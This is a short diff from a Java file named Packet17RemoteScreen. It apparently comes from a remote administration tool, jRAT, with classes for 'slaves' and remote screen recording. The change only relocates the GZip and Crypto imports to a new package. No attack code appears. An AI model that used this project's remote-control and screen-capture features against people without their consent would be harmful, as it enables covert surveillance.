@@ -13,13 +13,13 @@ import pro.jrat.Main;
 import pro.jrat.RemoteScreenData;
 import pro.jrat.Slave;
 import pro.jrat.Traffic;
+import pro.jrat.common.compress.GZip;
+import pro.jrat.common.crypto.Crypto;
 import pro.jrat.threads.ThreadImage;
 import pro.jrat.threads.ThreadRemoteScreenRecorder;
 import pro.jrat.ui.frames.FrameRemoteScreen;
 import pro.jrat.utils.ImageUtils;
 
-import com.redpois0n.common.compress.GZip;
-import com.redpois0n.common.crypto.Crypto;
 
 
 public class Packet17RemoteScreen extends AbstractIncomingPacket {
